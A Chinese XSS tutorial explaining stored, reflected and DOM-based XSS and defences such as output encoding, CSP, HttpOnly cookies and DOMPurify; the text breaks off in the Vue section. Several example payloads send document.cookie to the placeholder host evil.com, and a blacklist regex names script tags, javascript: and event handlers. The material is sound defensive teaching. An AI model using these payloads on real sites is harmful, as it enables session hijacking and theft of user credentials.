# XSS 漏洞详解与防御方案

> 本文档系统介绍跨站脚本攻击（XSS）的定义、分类、工作原理、攻击场景与危害，并针对不同类型 XSS 提供完整的防御措施（输入验证、输出编码、CSP、HttpOnly 等），附 JavaScript 环境下的防御代码示例与最佳实践。适合前端/全栈开发人员学习参考。

---

## 目录

- [一、XSS 漏洞概述](#一xss-漏洞概述)
  - [1.1 什么是 XSS](#11-什么是-xss)
  - [1.2 XSS 的工作原理](#12-xss-的工作原理)
  - [1.3 XSS 的危害分析](#13-xss-的危害分析)
- [二、XSS 分类详解](#二xss-分类详解)
  - [2.1 存储型 XSS](#21-存储型-xss)
  - [2.2 反射型 XSS](#22-反射型-xss)
  - [2.3 DOM 型 XSS](#23-dom-型-xss)
  - [2.4 三种类型对比](#24-三种类型对比)
- [三、常见攻击场景](#三常见攻击场景)
- [四、XSS 防御措施](#四xss-防御措施)
  - [4.1 输入验证与过滤](#41-输入验证与过滤)
  - [4.2 输出编码（核心防御）](#42-输出编码核心防御)
  - [4.3 CSP 内容安全策略](#43-csp-内容安全策略)
  - [4.4 HttpOnly Cookie](#44-httponly-cookie)
  - [4.5 其他防御手段](#45-其他防御手段)
- [五、JavaScript 防御代码示例](#五javascript-防御代码示例)
- [六、框架中的 XSS 防御](#六框架中的-xss-防御)
- [七、XSS 防御最佳实践](#七xss-防御最佳实践)
- [八、XSS 检测与测试](#八xss-检测与测试)
- [附录 参考资料](#附录-参考资料)

---

## 一、XSS 漏洞概述

### 1.1 什么是 XSS

**XSS（Cross-Site Scripting，跨站脚本攻击）** 是指攻击者向 Web 页面中注入恶意客户端脚本（通常是 JavaScript），当其他用户浏览该页面时，恶意脚本会在用户浏览器中执行，从而窃取用户数据、劫持会话、篡改页面等。

> **命名由来**：之所以叫"跨站脚本"而非 CSS，是为了与层叠样式表（CSS）区分。

**核心特征**：

| 特征 | 说明 |
| --- | --- |
| **注入点** | 任何用户输入被输出到页面的位置 |
| **执行环境** | 受害者浏览器，以**当前网站域名**身份执行 |
| **攻击载体** | JavaScript 为主，也可是 HTML/CSS/SVG/Flash |
| **关键危害** | 恶意脚本拥有与正常脚本同等的权限（同源策略保护下） |

**与 CSRF 的区别**：

| 维度 | XSS | CSRF |
| --- | --- | --- |
| **原理** | 注入脚本执行 | 伪造用户请求 |
| **是否需要登录** | 不一定 | 需要（利用已登录状态） |
| **攻击者是否获取数据** | ✅ 可窃取 | ❌ 不能直接读取响应 |
| **防御核心** | 输出编码 | Token / SameSite Cookie |

### 1.2 XSS 的工作原理

```
攻击流程：
┌──────────┐   ① 注入恶意代码   ┌──────────┐
│  攻击者   │ ──────────────────▶│  Web 应用 │
└──────────┘                    │（未过滤）  │
                                └─────┬────┘
                                      │ ② 存储/反射恶意代码
                                      ▼
                                ┌──────────┐
                                │  页面响应  │
                                └─────┬────┘
                                      │ ③ 用户访问含恶意代码的页面
                                      ▼
┌──────────┐   ④ 窃取 Cookie/劫持会话  ┌──────────┐
│  攻击者   │ ◀─────────────────│  受害者   │
│  服务器   │                    │  浏览器   │
└──────────┘                    └──────────┘
                                      │ ⑤ 恶意脚本在受害者浏览器执行
                                      │   （拥有当前域名权限）
                                      ▼
                                执行恶意操作：
                                - 窃取 Cookie
                                - 篡改页面
                                - 发起请求
                                - 键盘记录
```

**最简单的 XSS 示例**：

```html
<!-- 评论功能未过滤用户输入 -->
<div class="comment">
  <script>
    // 恶意脚本：窃取 Cookie 发送到攻击者服务器
    new Image().src = 'https://evil.com/steal?cookie=' + document.cookie
  </script>
</div>
```

当其他用户访问该评论页面时，恶意脚本自动执行，Cookie 被发送到攻击者服务器。

### 1.3 XSS 的危害分析

| 危害类型 | 具体表现 | 严重程度 |
| --- | --- | --- |
| **窃取凭证** | 偷取 Cookie/Session Token/LocalStorage Token | ★★★★★ |
| **会话劫持** | 用窃取的 Cookie 冒充用户操作 | ★★★★★ |
| **账户盗用** | 修改密码、绑定手机、转账 | ★★★★★ |
| **数据窃取** | 读取页面敏感信息（个人信息、订单） | ★★★★ |
| **钓鱼攻击** | 篡改页面伪造登录框骗取密码 | ★★★★ |
| **键盘记录** | 监听按键窃取输入 | ★★★ |
| **挖矿** | 注入挖矿脚本消耗 CPU | ★★ |
| **DDoS** | 控制大量浏览器发起分布式请求 | ★★★ |
| **恶意操作** | 以用户身份发帖、删除数据、转账 | ★★★★★ |
| **传播蠕虫** | 自动传播 XSS（如 Samy 蠕虫） | ★★★★ |

核心风险可以理解为：
> 攻击者让“不可信的数据”变成了浏览器可以解释或执行的内容。


---
### XSS 产生的根本原因
XSS 的核心原因是：
> 不可信的数据进入了危险的输出上下文，并被浏览器当成 HTML、JavaScript、URL 或其他可解释内容进行解析。
不可信数据可能来自：
用户输入
URL 参数
数据库
Cookie
LocalStorage
第三方 API
WebSocket
消息队列
特别需要注意：
> 数据来自数据库，并不代表数据一定安全。
攻击者可能早已将恶意内容保存进数据库。

## 二、XSS 分类详解

### 2.1 存储型 XSS
攻击者提交的恶意内容会被保存到服务器，例如数据库。
流程：
```text
攻击者提交内容
    ↓
数据库保存
    ↓
其他用户访问
    ↓
页面读取恶意内容
    ↓
浏览器解析或执行
```

**定义**：恶意代码被**存储在服务器**（数据库、缓存、文件），当其他用户访问相关页面时触发。

```
攻击流程：
攻击者 → 提交恶意评论 → 存入数据库 → 其他用户查看评论 → 恶意脚本执行
```

常见场景：
评论区
论坛
用户昵称
商品评价
聊天消息
博客文章
富文本编辑器
由于可能影响大量访问者，存储型 XSS 通常危害较大。

```html
<!-- 用户提交评论 -->
<form action="/comment" method="POST">
  <textarea name="content">好文章！
    <script>
      fetch('https://evil.com/steal?c=' + document.cookie)
    </script>
  </textarea>
  <button type="submit">提交</button>
</form>

<!-- 评论存入数据库后，其他用户访问评论列表 -->
<div class="comments">
  <!-- 服务端直接输出，未编码 -->
  <div class="comment">
    好文章！
    <script>
      fetch('https://evil.com/steal?c=' + document.cookie)
    </script>
  </div>
</div>
<!-- 所有访问该页面的用户都会执行恶意脚本 -->
```

**特点**：
- **持久化**：恶意代码存储在服务器，长期有效
- **影响广**：所有访问该页面的用户都受影响
- **危害大**：无需用户主动点击链接

**常见出现位置**：
- 论坛/博客评论
- 用户个人资料（昵称、签名）
- 消息/私信内容
- 商品评价
- 系统通知/公告

### 2.2 反射型 XSS
恶意内容通常存在于 URL 参数或请求参数中。
**定义**：恶意代码存在于**URL 参数**中，服务器将其"反射"到响应页面中，需诱导用户点击恶意链接。

```
攻击流程：
攻击者构造恶意链接 → 诱导用户点击 → 服务器读取参数并输出到页面 → 恶意脚本执行
```

**示例场景**：搜索结果页

```
正常链接：
https://example.com/search?q=手机

恶意链接（攻击者发送给受害者）：
https://example.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```
流程：
```text
攻击者构造链接
    ↓
用户访问链接
    ↓
服务器读取参数
    ↓
直接输出到页面
    ↓
浏览器解析恶意内容
```

```html
<!-- 服务端代码（Node.js 示例） -->
app.get('/search', (req, res) => {
  const keyword = req.query.q
  // 直接输出到 HTML，未编码 → 反射型 XSS
  res.send(`
    <h2>搜索结果：${keyword}</h2>
    <div>暂无相关商品</div>
  `)
})
```

当受害者点击恶意链接，`q` 参数的 `<script>` 被输出到页面并执行。

**特点**：
- **非持久化**：不存储在服务器，需通过 URL 传递
- **需诱导点击**：攻击者需诱使用户点击恶意链接
- **常见于钓鱼**：通过邮件/短信/社交平台发送恶意链接

**常见出现位置**：
- 搜索结果页
- 错误页面（如 404 提示"xxx 不存在"）
- 跳转参数（如 `redirect=https://evil.com`）
- 表单回显（输入错误后回填）

### 2.3 DOM 型 XSS

**定义**：恶意代码完全在**客户端 JavaScript** 处理，不经过服务器，通过修改 DOM 树触发。 主要发生在浏览器端

```
攻击流程：
攻击者构造恶意链接 → 用户点击 → 客户端 JS 读取 URL → 写入 DOM → 恶意脚本执行
```

**示例场景**：客户端跳转

```html
<!-- 页面 URL: https://example.com/page#default -->
<div id="content"></div>

<script>
  // 从 URL hash 读取内容，直接写入 DOM（危险！）
  const content = location.hash.slice(1)
  document.getElementById('content').innerHTML = content
</script>
```

```
攻击者构造链接：
https://example.com/page#<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

用户点击后，`innerHTML` 将 `<img>` 标签写入 DOM，`onerror` 事件触发执行恶意代码。

**特点**：
- **纯客户端**：不经过服务器，服务器日志无痕迹
- **难检测**：传统 WAF 无法检测（请求中无恶意 payload）
- **与现代框架相关**：滥用 `v-html`/`dangerouslySetInnerHTML` 易触发

**常见出现位置**：
- `innerHTML` / `outerHTML` 写入
- `document.write()`
- `eval()` / `Function()` 执行
- `location` 跳转（`javascript:` 协议）
- jQuery `$()` HTML 解析

### 2.4 三种类型对比

| 维度 | 存储型 | 反射型 | DOM 型 |
| --- | --- | --- | --- |
| **存储位置** | 服务器数据库 | URL 参数 | 客户端 DOM |
| **是否经过服务器** | ✅ | ✅ | ❌ |
| **持久化** | ✅ 长期 | ❌ 一次性 | ❌ 一次性 |
| **触发方式** | 用户访问页面 | 用户点击恶意链接 | 用户点击恶意链接 |
| **影响范围** | 所有访问者 | 点击链接者 | 点击链接者 |
| **危害程度** | ★★★★★ 最高 | ★★★★ 高 | ★★★ 中 |
| **检测难度** | 中 | 易 | 难 |
| **防御重点** | 输出编码 | 输出编码 | 前端安全编码 |

---

## 三、常见攻击场景

### 场景 1：评论/帖子注入（存储型）

```html
<!-- 攻击者在评论区提交 -->
<script>
  // 窃取所有访问者的 Cookie
  document.cookie.split(';').forEach(c => {
    new Image().src = 'https://evil.com/collect?cookie=' + encodeURIComponent(c)
  })
</script>
```

### 场景 2：个人信息伪造（存储型）

```html
<!-- 昵称设为恶意脚本 -->
<img src=x onerror="alert(document.cookie)">

<!-- 其他用户查看个人资料时触发 -->
```

### 场景 3：搜索参数注入（反射型）

```
https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

### 场景 4：URL 跳转漏洞（DOM 型）

```javascript
// 页面跳转逻辑（危险！）
const redirectUrl = new URLSearchParams(location.search).get('redirect')
location.href = redirectUrl  // 若 redirect=javascript:alert(1) 则执行
```

### 场景 5：富文本编辑器（存储型）

```html
<!-- 攻击者通过富文本编辑器提交 -->
<a href="javascript:alert(document.cookie)">点击查看详情</a>
<!-- 或 -->
<img src="x" onerror="steal()">
```

### 场景 6：JSON API 响应注入

```json
// API 返回的用户昵称含恶意脚本
{
  "username": "<script>alert('XSS')</script>"
}
```

若前端直接渲染到 HTML（如 `v-html`），则触发 XSS。

### 场景 7：SVG 文件注入

```xml
<!-- 上传含恶意脚本的 SVG 文件 -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
</svg>
```

直接访问该 SVG 文件时，脚本会执行。

---

## 四、XSS 防御措施

### 4.1 输入验证与过滤

**原则**：输入校验做"白名单"而非"黑名单"，但输入过滤不能替代输出编码。

#### 4.1.1 白名单验证

```javascript
/**
 * 白名单验证用户输入
 * @param {string} input - 用户输入
 * @param {RegExp} pattern - 允许的格式
 * @returns {boolean}
 */
function validateInput(input, pattern) {
  if (typeof input !== 'string') return false
  return pattern.test(input)
}

// 用户名：仅字母数字下划线，3-20 位
const usernamePattern = /^[a-zA-Z0-9_]{3,20}$/
console.log(validateInput('alice_123', usernamePattern))  // true
console.log(validateInput('<script>alert(1)</script>', usernamePattern))  // false

// 邮箱
const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/

// 手机号
const phonePattern = /^1[3-9]\d{9}$/

// URL（仅允许 http/https）
const urlPattern = /^https?:\/\/[^\s/$.?#].[^\s]*$/
```

#### 4.1.2 危险字符过滤

```javascript
/**
 * 过滤常见 XSS 危险字符（黑名单，仅作辅助手段）
 * 注意：黑名单无法覆盖所有变体，必须配合输出编码
 */
function filterDangerousChars(input) {
  if (typeof input !== 'string') return ''
  
  const dangerousPatterns = [
    /<script[^>]*>[\s\S]*?<\/script>/gi,  // <script> 标签
    /<iframe[^>]*>[\s\S]*?<\/iframe>/gi,  // <iframe> 标签
    /javascript:/gi,                       // javascript: 协议
    /on\w+\s*=/gi,                         // onXxx= 事件
    /eval\s*\(/gi,                         // eval(
    /expression\s*\(/gi,                   // CSS expression()
  ]
  
  let result = input
  dangerousPatterns.forEach(pattern => {
    result = result.replace(pattern, '')
  })
  return result
}

console.log(filterDangerousChars('<script>alert(1)</script>'))  // ''
console.log(filterDangerousChars('<img src=x onerror=alert(1)>'))  // '<img src=x >'
```

#### 4.1.3 富文本内容过滤

对于需要支持 HTML 的场景（如富文本编辑器），使用白名单标签过滤：

```javascript
/**
 * 富文本白名单过滤（简化版）
 * 生产环境建议使用 DOMPurify 库
 */
function sanitizeRichText(html) {
  // 允许的标签白名单
  const allowedTags = ['p', 'br', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre']
  // 允许的属性白名单
  const allowedAttributes = {
    a: ['href', 'title'],
    // 其他标签的允许属性
  }
  
  const doc = new DOMParser().parseFromString(html, 'text/html')
  const walker = doc.createTreeWalker(doc.body, NodeFilter.SHOW_ELEMENT)
  const toRemove = []
  
  let node = walker.currentNode
  while (node = walker.nextNode()) {
    const tagName = node.tagName.toLowerCase()
    
    // 移除不在白名单的标签
    if (!allowedTags.includes(tagName)) {
      toRemove.push(node)
      continue
    }
    
    // 移除不在白名单的属性
    const allowedAttrs = allowedAttributes[tagName] || []
    const attrs = [...node.attributes]
    attrs.forEach(attr => {
      if (!allowedAttrs.includes(attr.name)) {
        node.removeAttribute(attr.name)
      }
      // href 属性特殊处理：禁止 javascript: 协议
      if (attr.name === 'href' && /^\s*javascript:/i.test(attr.value)) {
        node.removeAttribute('href')
      }
    })
  }
  
  // 移除危险标签（保留子节点内容）
  toRemove.forEach(node => {
    const parent = node.parentNode
    while (node.firstChild) {
      parent.insertBefore(node.firstChild, node)
    }
    parent.removeChild(node)
  })
  
  return doc.body.innerHTML
}

console.log(sanitizeRichText('<p>正常</p><script>alert(1)</script>'))
// '<p>正常</p>'

console.log(sanitizeRichText('<a href="javascript:alert(1)">点击</a>'))
// '<a>点击</a>'
```

> **重要提示**：输入过滤**不能替代**输出编码。因为：
> - 用户输入可能合法但输出时仍需编码（如 `<` 在 HTML 语境需编码为 `&lt;`）
> - 不同输出位置需不同编码（HTML/JS/URL/属性）
> - 输入过滤可能误伤合法输入

### 4.2 输出编码（核心防御）

**原则**：根据输出位置选择对应的编码方式，这是 XSS 防御的**最核心手段**。

#### 4.2.1 HTML 上下文编码

```javascript
/**
 * HTML 实体编码（用于 HTML 标签内容）
 * 将 < > & " ' 转义为 HTML 实体
 */
function escapeHtml(str) {
  if (str == null) return ''
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;')  // 斜杠也转义，防 </script> 闭合
}

// 使用示例
const userInput = '<script>alert("XSS")</script>'
document.getElementById('content').innerHTML = escapeHtml(userInput)
// 输出：&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
// 页面显示：<script>alert("XSS")</script>（不执行）
```

#### 4.2.2 HTML 属性编码

```javascript
/**
 * HTML 属性编码（用于属性值中）
 * 注意：属性值必须用双引号包裹
 */
function escapeAttr(str) {
  if (str == null) return ''
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
}

// 使用示例
const userInput = '" onmouseover="alert(1)'
const html = `<input value="${escapeAttr(userInput)}">`
// 输出：<input value="&quot; onmouseover=&quot;alert(1)">
```

#### 4.2.3 JavaScript 上下文编码

```javascript
/**
 * JavaScript 字符串编码（用于 <script> 内或 JS 字符串中）
 * 将特殊字符转义为 Unicode 转义序列
 */
function escapeJs(str) {
  if (str == null) return ''
  return String(str)
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\//g, '\\/')
    .replace(/</g, '\\x3C')  // 防 </script>
    .replace(/>/g, '\\x3E')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\u2028/g, '\\u2028')  // 行分隔符
    .replace(/\u2029/g, '\\u2029')  // 段分隔符
}

// 使用示例
const userInput = '";alert(1);//'
const script = `<script>var name = "${escapeJs(userInput)}";</script>`
// 输出：<script>var name = "\";alert(1);//";</script>
```

#### 4.2.4 URL 编码

```javascript
/**
 * URL 编码（用于 URL 参数中）
 */
function escapeUrl(str) {
  if (str == null) return ''
  return encodeURIComponent(String(str))
}

// 使用示例
const userInput = 'javascript:alert(1)'
const url = `/redirect?url=${escapeUrl(userInput)}`
// 输出：/redirect?url=javascript%3Aalert(1)
```

#### 4.2.5 不同上下文的编码规则总结

| 输出位置 | 编码方式 | 示例 |
| --- | --- | --- |
| HTML 标签内容 `<div>X</div>` | HTML 实体编码 | `<` → `&lt;` |
| HTML 属性值 `<input value="X">` | HTML 属性编码（属性值加引号） | `"` → `&quot;` |
| `<script>` 内字符串 | JS 字符串编码 | `"` → `\"` |
| URL 参数 `?name=X` | URL 编码（encodeURIComponent） | `&` → `%26` |
| CSS 属性 `color: X` | CSS 编码（少用，建议避免） | `(` → `\28` |

### 4.3 CSP 内容安全策略

**CSP（Content Security Policy）** 是浏览器层面的安全策略，限制资源加载来源，是 XSS 的**纵深防御**手段。

#### 4.3.1 CSP 的作用

- 限制脚本来源（只允许同源/白名单域名）
- 禁止内联脚本（`<script>alert(1)</script>`）
- 禁止内联事件（`onload="..."`）
- 禁止 `eval()` 等危险函数
- 限制图片/样式/字体等资源来源
- 报告违规行为（report-uri）

#### 4.3.2 CSP 配置方式

**方式一：HTTP 响应头（推荐）**

```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
  report-uri /csp-report;
```

**方式二：meta 标签**

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; object-src 'none'">
```

#### 4.3.3 常用 CSP 指令

| 指令 | 说明 | 示例 |
| --- | --- | --- |
| `default-src` | 默认加载策略 | `default-src 'self'` |
| `script-src` | JavaScript 来源 | `script-src 'self' https://cdn.com` |
| `style-src` | 样式来源 | `style-src 'self' 'unsafe-inline'` |
| `img-src` | 图片来源 | `img-src 'self' data: https:` |
| `connect-src` | XHR/Fetch/WebSocket 连接 | `connect-src 'self' https://api.com` |
| `font-src` | 字体来源 | `font-src 'self' https://fonts.gstatic.com` |
| `object-src` | `<object>`/`<embed>` | `object-src 'none'`（禁用） |
| `frame-src` | iframe 来源 | `frame-src 'none'` |
| `base-uri` | `<base>` 标签 | `base-uri 'self'` |
| `frame-ancestors` | 谁能嵌入本页（防点击劫持） | `frame-ancestors 'none'` |
| `report-uri` | 违规上报地址 | `report-uri /csp-report` |

#### 4.3.4 CSP 来源值

| 来源值 | 说明 |
| --- | --- |
| `'self'` | 同源（同协议+域名+端口） |
| `'none'` | 禁止任何来源 |
| `https://cdn.com` | 指定域名 |
| `https:` | 所有 HTTPS |
| `'unsafe-inline'` | 允许内联（不推荐，降低安全性） |
| `'unsafe-eval'` | 允许 eval（不推荐） |
| `'nonce-xxx'` | 允许带特定 nonce 的脚本 |
| `'sha256-xxx'` | 允许特定哈希的脚本 |

#### 4.3.5 使用 nonce 应对内联脚本

```http
Content-Security-Policy: script-src 'self' 'nonce-abc123'
```

```html
<!-- 只有带正确 nonce 的脚本会执行 -->
<script nonce="abc123">
  console.log('安全脚本')
</script>

<script>
  console.log('会被 CSP 拦截')  // 无 nonce
</script>
```

**服务端生成 nonce（Node.js）**：

```javascript
const crypto = require('crypto')

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64')
  res.setHeader('Content-Security-Policy', 
    `script-src 'self' 'nonce-${res.locals.nonce}'`)
  next()
})

app.get('/', (req, res) => {
  res.send(`
    <script nonce="${res.locals.nonce}">
      console.log('安全内联脚本')
    </script>
  `)
})
```

#### 4.3.6 CSP 报告收集

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

> `Content-Security-Policy-Report-Only` 仅报告不拦截，用于上线前测试。

```javascript
// 服务端接收 CSP 违规报告
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP 违规：', req.body)
  // {
  //   "csp-report": {
  //     "document-uri": "https://example.com/page",
  //     "violated-directive": "script-src 'self'",
  //     "blocked-uri": "https://evil.com/malicious.js",
  //     "line-number": 12
  //   }
  // }
  res.status(204).end()
})
```

### 4.4 HttpOnly Cookie

**作用**：设置 `HttpOnly` 标志的 Cookie 无法被 JavaScript 读取（`document.cookie` 获取不到），有效防止 XSS 窃取 Cookie。

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

| 标志 | 作用 |
| --- | --- |
| `HttpOnly` | 禁止 JavaScript 读取 Cookie |
| `Secure` | 仅 HTTPS 传输 |
| `SameSite=Strict` | 跨站请求不携带 Cookie（防 CSRF） |
| `SameSite=Lax` | 顶层导航携带 Cookie（默认值） |

```javascript
// 服务端设置 HttpOnly Cookie（Node.js Express）
app.post('/login', (req, res) => {
  res.cookie('sessionid', token, {
    httpOnly: true,      // 防止 JS 读取（核心）
    secure: true,        // 仅 HTTPS
    sameSite: 'strict',  // 防 CSRF
    maxAge: 3600000,     // 1 小时
    path: '/',
  })
  res.send('登录成功')
})
```

```javascript
// 前端验证：HttpOnly Cookie 不可被 JS 读取
document.cookie  // 返回不含 sessionid 的其他 Cookie
```

> **注意**：HttpOnly 只防 Cookie 窃取，不防其他 XSS 危害（如页面篡改、键盘记录）。仍需配合输出编码。

### 4.5 其他防御手段

#### 4.5.1 设置 X-XSS-Protection（旧浏览器）

```http
X-XSS-Protection: 1; mode=block
```

- `1`：启用浏览器内置 XSS 过滤器
- `mode=block`：检测到 XSS 时阻止页面渲染

> 现代浏览器（Chrome 78+、Edge）已移除该功能，建议用 CSP 替代。但为兼容旧浏览器仍建议设置。

#### 4.5.2 禁用 JavaScript: 协议

```javascript
// 验证 URL 协议，仅允许 http/https
function isSafeUrl(url) {
  try {
    const parsed = new URL(url)
    return ['http:', 'https:'].includes(parsed.protocol)
  } catch {
    return false
  }
}

console.log(isSafeUrl('https://example.com'))      // true
console.log(isSafeUrl('javascript:alert(1)'))      // false
console.log(isSafeUrl('data:text/html,<script>'))  // false
```

#### 4.5.3 设置 X-Frame-Options（防点击劫持）

```http
X-Frame-Options: DENY
```

防止页面被 iframe 嵌入，避免点击劫持（虽非 XSS，但常配合使用）。

#### 4.5.4 输入长度限制

```html
<!-- 限制输入长度，减少攻击面 -->
<input type="text" maxlength="50" name="username">
<textarea maxlength="500" name="comment"></textarea>
```

#### 4.5.5 Cookie 前缀

```http
# __Host- 前缀：强制 Secure + Path=/ + 无 Domain
Set-Cookie: __Host-sessionid=abc; Secure; Path=/; HttpOnly

# __Secure- 前缀：仅强制 Secure
Set-Cookie: __Secure-token=xyz; Secure; HttpOnly
```

---

## 五、JavaScript 防御代码示例

### 5.1 综合防御工具函数

```javascript
/**
 * XSS 防御工具集
 */
const XSSTool = {
  /**
   * HTML 实体编码（标签内容）
   */
  escapeHtml(str) {
    if (str == null) return ''
    const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '/': '&#x2F;',
    }
    return String(str).replace(/[&<>"'/]/g, ch => map[ch])
  },

  /**
   * HTML 属性编码
   */
  escapeAttr(str) {
    if (str == null) return ''
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
  },

  /**
   * JavaScript 字符串编码
   */
  escapeJs(str) {
    if (str == null) return ''
    const map = {
      '\\': '\\\\',
      "'": "\\'",
      '"': '\\"',
      '`': '\\`',
      '\n': '\\n',
      '\r': '\\r',
      '\t': '\\t',
      '\b': '\\b',
      '\f': '\\f',
      '<': '\\x3C',
      '>': '\\x3E',
      '&': '\\x26',
      '\u2028': '\\u2028',
      '\u2029': '\\u2029',
    }
    return String(str).replace(/[\\'"`\n\r\t\b\f<>&\u2028\u2029]/g, ch => map[ch])
  },

  /**
   * URL 编码
   */
  escapeUrl(str) {
    if (str == null) return ''
    return encodeURIComponent(String(str))
  },

  /**
   * 验证 URL 安全性（仅允许 http/https/相对路径）
   */
  isSafeUrl(url) {
    if (!url) return true
    // 相对路径安全
    if (/^[\/#?]/.test(url) || /^[a-zA-Z0-9]+:/.test(url) === false) return true
    try {
      const parsed = new URL(url, window.location.origin)
      return ['http:', 'https:'].includes(parsed.protocol)
    } catch {
      return false
    }
  },

  /**
   * 安全设置 innerHTML（自动编码）
   */
  safeInnerHTML(element, content) {
    element.innerHTML = this.escapeHtml(content)
  },

  /**
   * 安全设置属性
   */
  safeSetAttr(element, attr, value) {
    element.setAttribute(attr, this.escapeAttr(value))
  },
}

// 使用示例
const input = '<script>alert("XSS")</script>'

// ❌ 危险写法
document.getElementById('content').innerHTML = input

// ✅ 安全写法
XSSTool.safeInnerHTML(document.getElementById('content'), input)
```

### 5.2 安全的 DOM 操作封装

```javascript
/**
 * 安全 DOM 操作工具
 * 原则：默认安全，显式不安全
 */
class SafeDOM {
  /**
   * 安全创建文本节点
   */
  static text(parent, content) {
    const textNode = document.createTextNode(content)
    parent.appendChild(textNode)
    return textNode
  }

  /**
   * 安全设置元素内容（textContent 替代 innerHTML）
   */
  static setContent(element, content) {
    // textContent 自动转义，不会解析 HTML
    element.textContent = content
  }

  /**
   * 安全设置属性
   */
  static setAttribute(element, name, value) {
    // 危险属性特殊处理
    const dangerousAttrs = ['onclick', 'onload', 'onerror', 'onmouseover']
    if (dangerousAttrs.includes(name.toLowerCase())) {
      console.warn(`禁止设置事件属性: ${name}`)
      return
    }
    // href/src 验证协议
    if (['href', 'src'].includes(name.toLowerCase())) {
      if (!XSSTool.isSafeUrl(value)) {
        console.warn(`不安全的 URL: ${value}`)
        return
      }
    }
    element.setAttribute(name, value)
  }

  /**
   * 安全插入 HTML（需先编码）
   */
  static insertHTML(element, html) {
    element.innerHTML = XSSTool.escapeHtml(html)
  }

  /**
   * 安全创建元素
   */
  static createElement(tag, attrs = {}, textContent = '') {
    const el = document.createElement(tag)
    Object.entries(attrs).forEach(([key, value]) => {
      this.setAttribute(el, key, value)
    })
    if (textContent) {
      el.textContent = textContent  // 安全
    }
    return el
  }
}

// 使用示例
const div = SafeDOM.createElement('div', 
  { class: 'user-info', 'data-id': '123' },
  userInput  // 自动安全编码
)
document.body.appendChild(div)
```

### 5.3 富文本内容安全过滤（生产级）

```javascript
/**
 * 生产级富文本过滤
 * 推荐使用 DOMPurify 库，以下为简化实现
 * 安装：npm install dompurify
 */
import DOMPurify from 'dompurify'

// 配置 DOMPurify
const cleanHtml = (dirty) => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [
      'p', 'br', 'b', 'i', 'em', 'strong', 'u', 's',
      'a', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
    ],
    ALLOWED_ATTR: ['href', 'title', 'src', 'alt', 'class', 'colspan', 'rowspan'],
    ALLOW_DATA_ATTR: false,
    // 禁止所有协议，仅允许 http/https
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  })
}

// 使用示例
const dirtyHtml = `
  <p>正常段落</p>
  <script>alert('XSS')</script>
  <img src="x" onerror="alert(1)">
  <a href="javascript:alert(1)">恶意链接</a>
  <a href="https://example.com">安全链接</a>
`

const clean = cleanHtml(dirtyHtml)
console.log(clean)
// <p>正常段落</p>
// <img src="x">  (onerror 被移除)
// <a>恶意链接</a>  (href 被移除)
// <a href="https://example.com">安全链接</a>
```

### 5.4 防 XSS 的 Axios 拦截器

```javascript
/**
 * Axios 响应拦截器：对返回数据做 XSS 清洗
 */
import DOMPurify from 'dompurify'

axios.interceptors.response.use((response) => {
  // 递归清洗响应数据中的字符串
  const sanitizeData = (data) => {
    if (typeof data === 'string') {
      // 清除 HTML 标签（仅保留纯文本）
      return DOMPurify.sanitize(data, { ALLOWED_TAGS: [] })
    }
    if (Array.isArray(data)) {
      return data.map(sanitizeData)
    }
    if (data && typeof data === 'object') {
      const result = {}
      for (const key in data) {
        result[key] = sanitizeData(data[key])
      }
      return result
    }
    return data
  }
  
  response.data = sanitizeData(response.data)
  return response
})
```

### 5.5 安全跳转函数

```javascript
/**
 * 安全页面跳转（防 javascript: 协议）
 */
function safeRedirect(url) {
  if (!XSSTool.isSafeUrl(url)) {
    console.error('不安全的跳转 URL:', url)
    return false
  }
  window.location.href = url
  return true
}

// 使用
const redirectUrl = new URLSearchParams(location.search).get('redirect')
safeRedirect(redirectUrl)  // javascript:alert(1) 会被拦截
```

---

## 六、框架中的 XSS 防御

### 6.1 Vue 3 中的 XSS 防御

**Vue 默认安全**：`{{ }}` 插值和属性绑定自动编码，**只有 `v-html` 危险**。

```vue
<template>
  <!-- ✅ 安全：自动编码 -->
  <div>{{ userInput }}</div>
  <div :title="userInput"></div>
  <a :href="url">链接</a>
  
  <!-- ❌ 危险：v-html 会解析 HTML -->
  <div v-html="userInput"></div>
</template>

<script setup>
